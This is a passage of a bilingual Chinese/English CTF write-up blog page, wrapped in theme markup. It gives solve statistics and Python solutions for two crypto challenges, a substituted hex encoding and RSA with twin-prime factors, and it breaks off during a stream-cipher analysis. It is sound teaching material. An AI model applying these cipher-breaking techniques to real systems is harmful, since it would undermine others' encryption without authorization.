<path fill="currentColor" d="M244 84L255.1 96L267.1 84.02C300.6 51.37 347 36.51 392.6 44.1C461.5 55.58 512 115.2 512 185.1V190.9C512 232.4 494.8 272.1 464.4 300.4L283.7 469.1C276.2 476.1 266.3 480 256 480C245.7 480 235.8 476.1 228.3 469.1L47.59 300.4C17.23 272.1 0 232.4 0 190.9V185.1C0 115.2 50.52 55.58 119.4 44.1C164.1 36.51 211.4 51.37 244 84C243.1 84 244 84.01 244 84L244 84zM255.1 163.9L210.1 117.1C188.4 96.28 157.6 86.4 127.3 91.44C81.55 99.07 48 138.7 48 185.1V190.9C48 219.1 59.71 246.1 80.34 265.3L256 429.3L431.7 265.3C452.3 246.1 464 219.1 464 190.9V185.1C464 138.7 430.4 99.07 384.7 91.44C354.4 86.4 323.6 96.28 301.9 117.1L255.1 163.9z"/></svg>
  </span>

</span>
        <span id="button_likes_text">&nbsp;Like</span>
    </button>
</span><span class="px-2 text-primary-500">&middot;</span>


<script type="text/javascript" src="/js/zen-mode.min.63c8a202661f4a2063fdc2706685d668e8ea3da613da2224e9da527e5876e4f53dcac39ab60732626fb4151feae5d430d0cf44731e5d3c726522fcc1519c1547.js" integrity="sha512-Y8iiAmYfSiBj/cJwZoXWaOjqPaYT2iIk6dpSflh25PU9ysOatgcyYm&#43;0FR/q5dQw0M9Ecx5dPHJlIvzBUZwVRw=="></script>

<span class="mb-[2px]">
    <span id="zen-mode-button"
          class="text-lg hover:text-primary-500"
          title="Enable zen mode"
          data-title-i18n-disable="Enable zen mode"
          data-title-i18n-enable="Disable zen mode">
        <span class="inline-block align-text-bottom">

  <span class="relative block icon">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 50 50" width="50px" height="50px">
    <path fill="currentColor" d="M 12.980469 4 C 9.1204688 4 5.9804688 7.14 5.9804688 11 L 6 26 L 9.9804688 26 L 9.9804688 11 C 9.9804688 9.35 11.320469 8 12.980469 8 L 40.019531 8 C 41.679531 8 43.019531 9.35 43.019531 11 L 43.019531 39 C 43.019531 40.65 41.679531 42 40.019531 42 L 29 42 C 29 43.54 28.420938 44.94 27.460938 46 L 40.019531 46 C 43.879531 46 47.019531 42.86 47.019531 39 L 47.019531 11 C 47.019531 7.14 43.879531 4 40.019531 4 L 12.980469 4 z M 7 28 C 4.794 28 3 29.794 3 32 L 3 42 C 3 44.206 4.794 46 7 46 L 23 46 C 25.206 46 27 44.206 27 42 L 27 32 C 27 29.794 25.206 28 23 28 L 7 28 z M 7 32 L 23 32 L 23.001953 42 L 7 42 L 7 32 z"/>
</svg>
  </span>

</span>
    </span>
</span>
  

  
  
</div>


<div class="flex flex-row flex-wrap items-center">
  
  
  
  
  
  
  
  
  
  
  
  
  
</div>




<div class="flex flex-row flex-wrap items-center">
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
</div>



    </div>

    
    
    
    
    

    

    
      
      
        
        
<div class="flex author">
  
    
    
      
    
    
      
        
      
      <img class="!mt-0 !mb-0 h-24 w-24 rounded-2xl ltr:mr-4 rtl:ml-4" width="96" height="96"
      alt="hokak" src="/img/author_hu6047748240582865998.gif" />
    
  
  <div class="place-self-center">
    
    <div class="text-[0.6rem] uppercase leading-3 text-neutral-500 dark:text-neutral-400">
      Author
    </div>
    <div class="font-semibold leading-6 text-neutral-800 dark:text-neutral-300">
      hokak
    </div>
    
    
    <div class="text-sm text-neutral-700 dark:text-neutral-400">need more sleep</div>
    
    <div class="text-2xl sm:text-lg">
  <div class="flex flex-wrap text-neutral-400 dark:text-neutral-500">
    
      
        <a
          class="px-1 hover:text-primary-700 dark:hover:text-primary-400"
          href="https://github.com/asia-hokak"
          target="_blank"
          aria-label="Github"
          rel="me noopener noreferrer"
          ><span class="inline-block align-text-bottom">

  <span class="relative block icon">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"><path fill="currentColor" d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6zm-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3zm44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9zM244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8zM97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1zm-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7zm32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1zm-11.4-14.7c-1.6 1-1.6 3.6 0 5.9 1.6 2.3 4.3 3.3 5.6 2.3 1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2z"/></svg>

  </span>

</span></a
        >
      
    
      
        <a
          class="px-1 hover:text-primary-700 dark:hover:text-primary-400"
          href="mailto:hokak65535@gmail.com"
          target="_blank"
          aria-label="Email"
          rel="me noopener noreferrer"
          ><span class="inline-block align-text-bottom">

  <span class="relative block icon">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M207.8 20.73c-93.45 18.32-168.7 93.66-187 187.1c-27.64 140.9 68.65 266.2 199.1 285.1c19.01 2.888 36.17-12.26 36.17-31.49l.0001-.6631c0-15.74-11.44-28.88-26.84-31.24c-84.35-12.98-149.2-86.13-149.2-174.2c0-102.9 88.61-185.5 193.4-175.4c91.54 8.869 158.6 91.25 158.6 183.2l0 16.16c0 22.09-17.94 40.05-40 40.05s-40.01-17.96-40.01-40.05v-120.1c0-8.847-7.161-16.02-16.01-16.02l-31.98 .0036c-7.299 0-13.2 4.992-15.12 11.68c-24.85-12.15-54.24-16.38-86.06-5.106c-38.75 13.73-68.12 48.91-73.72 89.64c-9.483 69.01 43.81 128 110.9 128c26.44 0 50.43-9.544 69.59-24.88c24 31.3 65.23 48.69 109.4 37.49C465.2 369.3 496 324.1 495.1 277.2V256.3C495.1 107.1 361.2-9.332 207.8 20.73zM239.1 304.3c-26.47 0-48-21.56-48-48.05s21.53-48.05 48-48.05s48 21.56 48 48.05S266.5 304.3 239.1 304.3z"/></svg>

  </span>

</span></a
        >
      
    
      
        <a
          class="px-1 hover:text-primary-700 dark:hover:text-primary-400"
          href="https://www.instagram.com/hokak_/"
          target="_blank"
          aria-label="Instagram"
          rel="me noopener noreferrer"
          ><span class="inline-block align-text-bottom">

  <span class="relative block icon">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><path fill="currentColor" d="M224.1 141c-63.6 0-114.9 51.3-114.9 114.9s51.3 114.9 114.9 114.9S339 319.5 339 255.9 287.7 141 224.1 141zm0 189.6c-41.1 0-74.7-33.5-74.7-74.7s33.5-74.7 74.7-74.7 74.7 33.5 74.7 74.7-33.6 74.7-74.7 74.7zm146.4-194.3c0 14.9-12 26.8-26.8 26.8-14.9 0-26.8-12-26.8-26.8s12-26.8 26.8-26.8 26.8 12 26.8 26.8zm76.1 27.2c-1.7-35.9-9.9-67.7-36.2-93.9-26.2-26.2-58-34.4-93.9-36.2-37-2.1-147.9-2.1-184.9 0-35.8 1.7-67.6 9.9-93.9 36.1s-34.4 58-36.2 93.9c-2.1 37-2.1 147.9 0 184.9 1.7 35.9 9.9 67.7 36.2 93.9s58 34.4 93.9 36.2c37 2.1 147.9 2.1 184.9 0 35.9-1.7 67.7-9.9 93.9-36.2 26.2-26.2 34.4-58 36.2-93.9 2.1-37 2.1-147.8 0-184.8zM398.8 388c-7.8 19.6-22.9 34.7-42.6 42.6-29.5 11.7-99.5 9-132.1 9s-102.7 2.6-132.1-9c-19.6-7.8-34.7-22.9-42.6-42.6-11.7-29.5-9-99.5-9-132.1s-2.6-102.7 9-132.1c7.8-19.6 22.9-34.7 42.6-42.6 29.5-11.7 99.5-9 132.1-9s102.7-2.6 132.1 9c19.6 7.8 34.7 22.9 42.6 42.6 11.7 29.5 9 99.5 9 132.1s2.7 102.7-9 132.1z"/></svg>

  </span>

</span></a
        >
      
    
      
        <a
          class="px-1 hover:text-primary-700 dark:hover:text-primary-400"
          href="https://www.facebook.com/asiahokak/"
          target="_blank"
          aria-label="Facebook"
          rel="me noopener noreferrer"
          ><span class="inline-block align-text-bottom">

  <span class="relative block icon">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M504 256C504 119 393 8 256 8S8 119 8 256c0 123.78 90.69 226.38 209.25 245V327.69h-63V256h63v-54.64c0-62.15 37-96.48 93.67-96.48 27.14 0 55.52 4.84 55.52 4.84v61h-31.28c-30.8 0-40.41 19.12-40.41 38.73V256h68.78l-11 71.69h-57.78V501C413.31 482.38 504 379.78 504 256z"/></svg>

  </span>

</span></a
        >
      
    
      
        <a
          class="px-1 hover:text-primary-700 dark:hover:text-primary-400"
          href="https://steamcommunity.com/id/CreeperSH/"
          target="_blank"
          aria-label="Steam"
          rel="me noopener noreferrer"
          ><span class="inline-block align-text-bottom">

  <span class="relative block icon">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"><path fill="currentColor" d="M496 256c0 137-111.2 248-248.4 248-113.8 0-209.6-76.3-239-180.4l95.2 39.3c6.4 32.1 34.9 56.4 68.9 56.4 39.2 0 71.9-32.4 70.2-73.5l84.5-60.2c52.1 1.3 95.8-40.9 95.8-93.5 0-51.6-42-93.5-93.7-93.5s-93.7 42-93.7 93.5v1.2L176.6 279c-15.5-.9-30.7 3.4-43.5 12.1L0 236.1C10.2 108.4 117.1 8 247.6 8 384.8 8 496 119 496 256zM155.7 384.3l-30.5-12.6a52.79 52.79 0 0 0 27.2 25.8c26.9 11.2 57.8-1.6 69-28.4 5.4-13 5.5-27.3.1-40.3-5.4-13-15.5-23.2-28.5-28.6-12.9-5.4-26.7-5.2-38.9-.6l31.5 13c19.8 8.2 29.2 30.9 20.9 50.7-8.3 19.9-31 29.2-50.8 21zm173.8-129.9c-34.4 0-62.4-28-62.4-62.3s28-62.3 62.4-62.3 62.4 28 62.4 62.3-27.9 62.3-62.4 62.3zm.1-15.6c25.9 0 46.9-21 46.9-46.8 0-25.9-21-46.8-46.9-46.8s-46.9 21-46.9 46.8c.1 25.8 21.1 46.8 46.9 46.8z"/></svg>

  </span>

</span></a
        >
      
    
  </div>

</div>
  </div>
</div>

      

      

      
      <div class="mb-5"></div>
      

    

  </header>
  
  <section class="flex flex-col max-w-full mt-0 prose dark:prose-invert lg:flex-row">
    
     <div
      class="order-first lg:ml-auto px-0 lg:order-last ltr:lg:pl-8 rtl:lg:pr-8">
      <div class="toc ltr:pl-5 rtl:pr-5 print:hidden lg:sticky lg:top-[140px]">

         <details open id="TOCView"
  class="toc-right mt-0 overflow-y-scroll overscroll-contain scrollbar-thin scrollbar-track-neutral-200 scrollbar-thumb-neutral-400 dark:scrollbar-track-neutral-800 dark:scrollbar-thumb-neutral-600 rounded-lg ltr:-ml-5 ltr:pl-5 rtl:-mr-5 rtl:pr-5 hidden lg:block">
  <summary
    class="block py-1 text-lg font-semibold cursor-pointer bg-neutral-100 text-neutral-800 ltr:-ml-5 ltr:pl-5 rtl:-mr-5 rtl:pr-5 dark:bg-neutral-700 dark:text-neutral-100 lg:hidden">
    Table of Contents
  </summary>
  <div
    class="min-w-[220px] py-2 border-dotted ltr:-ml-5 ltr:border-l ltr:pl-5 rtl:-mr-5 rtl:border-r rtl:pr-5 dark:border-neutral-600">
    <nav id="TableOfContents">
  <ul>
    <li><a href="#解題狀況">解題狀況</a></li>
    <li><a href="#crypto">Crypto</a>
      <ul>
        <li><a href="#snake">SNAKE</a></li>
        <li><a href="#twins">Twins</a></li>
        <li><a href="#speeded-block-cipher">speeded block cipher</a>
          <ul>
            <li><a href="#analysis-of-the-encryption">Analysis of the Encryption</a></li>
            <li><a href="#sol">sol</a></li>
          </ul>
        </li>
        <li><a href="#yoshinos-secret">Yoshino&rsquo;s Secret</a></li>
        <li><a href="#proactive-planning">Proactive Planning</a></li>
      </ul>
    </li>
    <li><a href="#pwn">Pwn</a>
      <ul>
        <li><a href="#money-overflow">Money overflow</a></li>
        <li><a href="#insecure-shell">Insecure Shell</a></li>
        <li><a href="#once">Once</a></li>
        <li><a href="#bank-clerk">bank clerk</a>
          <ul>
            <li><a href="#找offset">找offset</a></li>
            <li><a href="#改got">改got</a></li>
            <li><a href="#unintend-solve">unintend solve</a></li>
          </ul>
        </li>
        <li><a href="#painter">Painter</a></li>
      </ul>
    </li>
    <li><a href="#reverse">Reverse</a>
      <ul>
        <li><a href="#西">西</a></li>
        <li><a href="#flag-checker">flag checker</a>
          <ul>
            <li><a href="#sol-1">sol</a></li>
          </ul>
        </li>
        <li><a href="#noodle">noodle</a>
          <ul>
            <li><a href="#sol-2">sol</a></li>
            <li><a href="#sol2">sol2</a></li>
          </ul>
        </li>
        <li><a href="#empty">empty</a></li>
        <li><a href="#demon-summoning">demon summoning</a></li>
      </ul>
    </li>
  </ul>
</nav>
  </div>
</details>
<details class="toc-inside mt-0 overflow-hidden rounded-lg ltr:-ml-5 ltr:pl-5 rtl:-mr-5 rtl:pr-5 lg:hidden">
  <summary
    class="py-1 text-lg font-semibold cursor-pointer bg-neutral-100 text-neutral-800 ltr:-ml-5 ltr:pl-5 rtl:-mr-5 rtl:pr-5 dark:bg-neutral-700 dark:text-neutral-100 lg:hidden">
    Table of Contents
  </summary>
  <div
    class="py-2 border-dotted border-neutral-300 ltr:-ml-5 ltr:border-l ltr:pl-5 rtl:-mr-5 rtl:border-r rtl:pr-5 dark:border-neutral-600">
    <nav id="TableOfContents">
  <ul>
    <li><a href="#解題狀況">解題狀況</a></li>
    <li><a href="#crypto">Crypto</a>
      <ul>
        <li><a href="#snake">SNAKE</a></li>
        <li><a href="#twins">Twins</a></li>
        <li><a href="#speeded-block-cipher">speeded block cipher</a>
          <ul>
            <li><a href="#analysis-of-the-encryption">Analysis of the Encryption</a></li>
            <li><a href="#sol">sol</a></li>
          </ul>
        </li>
        <li><a href="#yoshinos-secret">Yoshino&rsquo;s Secret</a></li>
        <li><a href="#proactive-planning">Proactive Planning</a></li>
      </ul>
    </li>
    <li><a href="#pwn">Pwn</a>
      <ul>
        <li><a href="#money-overflow">Money overflow</a></li>
        <li><a href="#insecure-shell">Insecure Shell</a></li>
        <li><a href="#once">Once</a></li>
        <li><a href="#bank-clerk">bank clerk</a>
          <ul>
            <li><a href="#找offset">找offset</a></li>
            <li><a href="#改got">改got</a></li>
            <li><a href="#unintend-solve">unintend solve</a></li>
          </ul>
        </li>
        <li><a href="#painter">Painter</a></li>
      </ul>
    </li>
    <li><a href="#reverse">Reverse</a>
      <ul>
        <li><a href="#西">西</a></li>
        <li><a href="#flag-checker">flag checker</a>
          <ul>
            <li><a href="#sol-1">sol</a></li>
          </ul>
        </li>
        <li><a href="#noodle">noodle</a>
          <ul>
            <li><a href="#sol-2">sol</a></li>
            <li><a href="#sol2">sol2</a></li>
          </ul>
        </li>
        <li><a href="#empty">empty</a></li>
        <li><a href="#demon-summoning">demon summoning</a></li>
      </ul>
    </li>
  </ul>
</nav>
  </div>
</details>

<script>

  var margin = 200;
  var marginError = 50;

  (function () {
    var $window = $(window);
    var $toc = $('#TOCView');
    var tocHeight = $toc.height();

    function onResize() {
      var windowAndMarginHeight = $window.height() - margin;
      if(tocHeight >= windowAndMarginHeight) {
        $toc.css("overflow-y", "scroll")
        $toc.css("max-height", (windowAndMarginHeight + marginError) + "px")
      } else {
        $toc.css("overflow-y", "hidden")
        $toc.css("max-height", "9999999px")
      }
    }

    $window.on('resize', onResize);
    $(document).ready(onResize);
  })();



  (function () {
    var $toc = $('#TableOfContents');
    if ($toc.length > 0) {
      var $window = $(window);

      function onScroll() {
        var currentScroll = $window.scrollTop();
        var h = $('.anchor');
        var id = "";
        h.each(function (i, e) {
          e = $(e);
          if (e.offset().top - $(window).height()/3 <= currentScroll) {
            id = decodeURIComponent(e.attr('id'));
          }
        });
        var active = $toc.find('a.active');      
        if (active.length == 1 && active.eq(0).attr('href') == '#' + id) return true;

        active.each(function (i, e) {
          
            $(e).removeClass('active');
          
        });
        $toc.find('a[href="#' + id + '"]').addClass('active')
        $toc.find('a[href="#' + id + '"]').parentsUntil('#TableOfContents').each(function (i, e) {
          $(e).children('a').parents('ul').show();          
        });
      }

      $window.on('scroll', onScroll);
      $(document).ready(function () {
        
        onScroll();
      });
    }
  })();


</script>
   </div>
      </div>
      

      <div class="min-w-0 min-h-0 max-w-fit">
        
        


        <div class="article-content max-w-prose mb-20">
          

<h2 class="relative group">解題狀況 
    <div id="%E8%A7%A3%E9%A1%8C%E7%8B%80%E6%B3%81" class="anchor"></div>
    
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
            style="text-decoration-line: none !important;" href="#%E8%A7%A3%E9%A1%8C%E7%8B%80%E6%B3%81" aria-label="Anchor">#</a>
    </span>        
    
</h2>
<table>
<thead>
<tr>
<th>category</th>
<th>diffculity</th>
<th>challenge</th>
<th>solves</th>
</tr>
</thead>
<tbody>
<tr>
<td>Crypto</td>
<td>easy</td>
<td>Twins</td>
<td>85</td>
</tr>
<tr>
<td>Crypto</td>
<td>easy</td>
<td>SNAKE</td>
<td>77</td>
</tr>
<tr>
<td>Crypto</td>
<td>medium</td>
<td>Yoshino&rsquo;s Secret</td>
<td>30</td>
</tr>
<tr>
<td>Crypto</td>
<td>medium</td>
<td>Speeded Block Cipher</td>
<td>25</td>
</tr>
<tr>
<td>Crypto</td>
<td>hard</td>
<td>Proactive Planning</td>
<td>4</td>
</tr>
<tr>
<td>Pwn</td>
<td>easy</td>
<td>Money Overflow</td>
<td>59</td>
</tr>
<tr>
<td>Pwn</td>
<td>easy</td>
<td>Insecure Shell</td>
<td>37</td>
</tr>
<tr>
<td>Pwn</td>
<td>medium</td>
<td>Once</td>
<td>19</td>
</tr>
<tr>
<td>Pwn</td>
<td>hard</td>
<td>Bank Clerk</td>
<td>5</td>
</tr>
<tr>
<td>Pwn</td>
<td>hard</td>
<td>Painter</td>
<td>3</td>
</tr>
<tr>
<td>Reverse</td>
<td>baby</td>
<td>西</td>
<td>100</td>
</tr>
<tr>
<td>Reverse</td>
<td>medium</td>
<td>Flag Checker</td>
<td>31</td>
</tr>
<tr>
<td>Reverse</td>
<td>medium</td>
<td>Noo dle</td>
<td>22</td>
</tr>
<tr>
<td>Reverse</td>
<td>hard</td>
<td>Empty</td>
<td>13</td>
</tr>
<tr>
<td>Reverse</td>
<td>hard</td>
<td>Demon Summoning</td>
<td>12</td>
</tr>
</tbody>
</table>
<p>沒跟預想的差很多:D<br>
難度有控對</p>


<h2 class="relative group">Crypto 
    <div id="crypto" class="anchor"></div>
    
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
            style="text-decoration-line: none !important;" href="#crypto" aria-label="Anchor">#</a>
    </span>        
    
</h2>


<h3 class="relative group">SNAKE 
    <div id="snake" class="anchor"></div>
    
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
            style="text-decoration-line: none !important;" href="#snake" aria-label="Anchor">#</a>
    </span>        
    
</h3>
<p>把拆開來看大概經過了下面的步驟<br>
The process can roughly be broken down into the following steps:</p>
<ul>
<li>轉成二進位的字串<br>
Convert to a binary string</li>
<li>遍歷nibble(四個bit稱nibble)<br>
Iterate over the nibble (a nibble consists of four bits)</li>
<li>把nibble轉成數字<br>
Convert the nibble to a number</li>
<li>用這個數字當index去存取一個字母表<br>
Use this number as an index to access a character set</li>
</ul>
<p>這就是一個hex encode，把剛剛那個字母表取代為hex用到的字母表就好了<br>
This is a hex encoding, just replace the previous character set with the one used in hex encoding.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">a</span> <span class="o">=</span> <span class="s2">&#34;!@#$%^&amp;*()</span><span class="si">{}</span><span class="s2">[]:;&#34;</span>
</span></span><span class="line"><span class="cl"><span class="n">b</span> <span class="o">=</span> <span class="s2">&#34;0123456789abcdef&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">C</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s1">&#39;output.txt&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">16</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">C</span> <span class="o">=</span> <span class="n">C</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="n">a</span><span class="p">[</span><span class="n">i</span><span class="p">],</span> <span class="n">b</span><span class="p">[</span><span class="n">i</span><span class="p">])</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="nb">bytes</span><span class="o">.</span><span class="n">fromhex</span><span class="p">(</span><span class="n">C</span><span class="p">))</span>
</span></span></code></pre></div>

<h3 class="relative group">Twins 
    <div id="twins" class="anchor"></div>
    
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
            style="text-decoration-line: none !important;" href="#twins" aria-label="Anchor">#</a>
    </span>        
    
</h3>
<p>這題是孿生質數(twin prime)相乘<br>
$ N = p \cdot (p + 2) $<br>
因為:<br>
$ (p + 1)^2 = p^2 + 2p + 1 $<br>
所以:<br>
$ p^2 &lt; N &lt; (p + 1)^2$<br>
$ p &lt; \sqrt{N} &lt; p+1$<br>
由以上推導(其實也可以不用知道)，$\sqrt{N}$會非常接近$p$<br>
有$p$就可以分解$N$了</p>
<hr>
<p>This problem is about the multiplication of twin primes.<br>
$ N = p \cdot (p + 2) $<br>
Because:<br>
$ (p + 1)^2 = p^2 + 2p + 1 $<br>
Therefore:<br>
$ p^2 &lt; N &lt; (p + 1)^2$<br>
$ p &lt; \sqrt{N} &lt; p+1$<br>
From the above, we can deduce (though not necessarily need to know this), that $\sqrt{N}$ is very close to $p$.<br>
Once we have $p$, we can factor $N$.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">Crypto.Util.number</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">gmpy2</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">N</span> <span class="o">=</span> <span class="mi">28265512785148668054687043164424479693022518403222612488086445701689124273153696780242227509530772578907204832839238806308349909883785833919803783017981782039457779890719524768882538916689390586069021017913449495843389734501636869534811161705302909526091341688003633952946690251723141803504236229676764434381120627728396492933432532477394686210236237307487092128430901017076078672141054391434391221235250617521040574175917928908260464932759768756492640542972712185979573153310617473732689834823878693765091574573705645787115368785993218863613417526550074647279387964173517578542035975778346299436470983976879797185599</span>
</span></span><span class="line"><span class="cl"><span class="n">e</span> <span class="o">=</span> <span class="mi">65537</span>
</span></span><span class="line"><span class="cl"><span class="n">C</span> <span class="o">=</span> <span class="mi">1234497647123308288391904075072934244007064896189041550178095227267495162612272877152882163571742252626259268589864910102423177510178752163223221459996160714504197888681222151502228992956903455786043319950053003932870663183361471018529120546317847198631213528937107950028181726193828290348098644533807726842037434372156999629613421312700151522193494400679327751356663646285177221717760901491000675090133898733612124353359435310509848314232331322850131928967606142771511767840453196223470254391920898879115092727661362178200356905669261193273062761808763579835188897788790062331610502780912517243068724827958000057923</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">p</span> <span class="o">=</span> <span class="n">gmpy2</span><span class="o">.</span><span class="n">isqrt</span><span class="p">(</span><span class="n">N</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">q</span> <span class="o">=</span> <span class="n">p</span> <span class="o">+</span> <span class="mi">2</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">assert</span> <span class="n">p</span> <span class="o">*</span> <span class="n">q</span> <span class="o">==</span> <span class="n">N</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">phi</span> <span class="o">=</span> <span class="p">(</span><span class="n">p</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)</span> <span class="o">*</span> <span class="p">(</span><span class="n">q</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">d</span> <span class="o">=</span> <span class="nb">pow</span><span class="p">(</span><span class="n">e</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="n">phi</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">m</span> <span class="o">=</span> <span class="nb">pow</span><span class="p">(</span><span class="n">C</span><span class="p">,</span> <span class="n">d</span><span class="p">,</span> <span class="n">N</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">long_to_bytes</span><span class="p">(</span><span class="n">m</span><span class="p">))</span>
</span></span></code></pre></div>

<h3 class="relative group">speeded block cipher 
    <div id="speeded-block-cipher" class="anchor"></div>
    
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
            style="text-decoration-line: none !important;" href="#speeded-block-cipher" aria-label="Anchor">#</a>
    </span>        
    
</h3>
<p>標題詐騙，其實是stream cipher<br>
The title is misleading; it’s actually a stream cipher.</p>


<h4 class="relative group">Analysis of the Encryption 
    <div id="analysis-of-the-encryption" class="anchor"></div>
    
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
            style="text-decoration-line: none !important;" href="#analysis-of-the-encryption" aria-label="Anchor">#</a>
    </span>        
    
</h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="n">encrypted_flag</span> <span class="o">=</span> <span class="n">encrypt</span><span class="p">(</span><span class="n">pad</span><span class="p">(</span><span class="n">FLAG</span><span class="p">))</span><span class="o">.</span><span class="n">hex</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;Here is your encrypted flag: </span><span class="si">{</span><span class="n">encrypted_flag</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">plaintext</span> <span class="o">=</span> <span class="nb">input</span><span class="p">(</span><span class="s2">&#34;encrypt(hex) &gt; &#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">plaintext</span> <span class="o">=</span> <span class="nb">bytes</span><span class="o">.</span><span class="n">fromhex</span><span class="p">(</span><span class="n">plaintext</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">ciphertext</span> <span class="o">=</span> <span class="n">encrypt</span><span class="p">(</span><span class="n">pad</span><span class="p">(</span><span class="n">plaintext</span><span class="p">))</span><span class="o">.</span><span class="n">hex</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;ciphertext: </span><span class="si">{</span><span class="n">ciphertext</span><span class="si">}</span><span class="s2">)</span>
</span></span></code></pre></div><p>把pad過後的<code>FLAG</code>先丟進去加密<br>
接下來有無數次加密<br>
